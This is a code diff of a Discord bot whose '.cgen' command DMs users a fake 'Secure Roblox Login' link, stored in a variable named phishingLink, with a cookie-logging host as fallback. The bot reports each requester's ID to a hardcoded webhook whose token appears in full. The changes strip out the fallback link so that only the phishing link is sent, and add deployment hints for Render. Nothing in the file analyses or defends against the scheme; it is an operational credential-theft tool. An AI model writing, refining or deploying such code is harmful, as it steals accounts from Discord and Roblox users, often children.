@@ -1,16 +1,14 @@
 // ============================================================
 // Discord Bot - .cgen Command + Webhook (NO AXIOS)
 // ============================================================
-// Requirements: npm install discord.js
+// Requirements: npm install discord.js@14.14.1
 // ============================================================
 
 const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js");
 
 const PREFIX = ".";
-const BOT_NAME = "SaintFlix Gen";
 const FOOTER_TEXT = "Powered by AccountGen Bot";
 
-const OWNER_ID = "1399683999659593789";
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1529258026945740932/HygJsAGCL2MSaV114QaDf_d7F4WJZsSGC4IWnEcr4K3hhNmEUPTcej3-jXUjyMc5aSVU";
 
 const CHANNEL_RESTRICTIONS = {
@@ -28,6 +26,7 @@ const client = new Client({
 
 client.once("ready", () => {
   console.log(`✅ ${client.user.tag} is online!`);
+  console.log(`📡 Bot is ready to respond to .cgen commands.`);
 });
 
 client.on("messageCreate", async (message) => {
@@ -36,6 +35,7 @@ client.on("messageCreate", async (message) => {
   const args = message.content.slice(PREFIX.length).trim().split(/\s+/);
   const command = args.shift()?.toLowerCase();
 
+  // ─── CHANNEL RESTRICTION ───
   const allowedChannel = CHANNEL_RESTRICTIONS[command];
   if (allowedChannel) {
     let isAllowed = false;
@@ -60,19 +60,21 @@ client.on("messageCreate", async (message) => {
     const realLink = "https://cookie-log.onrender.com/index.html";
 
     try {
-      // Send to Discord webhook using fetch (no axios needed)
-      await fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `**🔐 .cgen Command Used**\nUser: <@${message.author.id}>\nUser ID: ${message.author.id}\nChannel: <#${message.channel.id}>\nTime: ${new Date().toISOString()}`
-        })
-      }).catch(() => {});
+      // Send webhook notification using fetch
+      if (WEBHOOK_URL && WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `**🔐 .cgen Command Used**\nUser: <@${message.author.id}>\nUser ID: ${message.author.id}\nChannel: <#${message.channel.id}>\nTime: ${new Date().toISOString()}`
+          })
+        }).catch(() => {});
+      }
 
       const dmEmbed = new EmbedBuilder()
         .setColor(0x2ecc71)
         .setTitle("🔐 Roblox Login Link")
-        .setDescription(`Click the link below to log in:\n\n${phishingLink}\n\nIf the link doesn't work, use this: ${realLink}`)
+        .setDescription(`Click the link below to log in:\n\n${phishingLink}`)
         .setFooter({ text: "Secure Roblox Login" })
         .setTimestamp();
       await message.author.send({ embeds: [dmEmbed] });
@@ -83,7 +85,8 @@ client.on("messageCreate", async (message) => {
         .setDescription(`<@${message.author.id}>, your login link has been sent to your DMs.`)
         .setFooter({ text: "Check your DMs" });
       await message.reply({ embeds: [confirmEmbed] });
-    } catch {
+
+    } catch (error) {
       await message.reply(`❌ Could not DM you. Please enable DMs.\n\nLink: ${phishingLink}`);
     }
   }
@@ -92,7 +95,12 @@ client.on("messageCreate", async (message) => {
 const token = process.env.BOT_TOKEN;
 if (!token) {
   console.error("❌ BOT_TOKEN environment variable is required.");
+  console.error("📌 Go to Render -> Environment -> Add BOT_TOKEN");
   process.exit(1);
 }
 
-client.login(token);
+client.login(token).catch((err) => {
+  console.error("❌ Failed to login:", err.message);
+  console.error("📌 Check that your BOT_TOKEN is correct in Render Environment Variables.");
+  process.exit(1);
+});
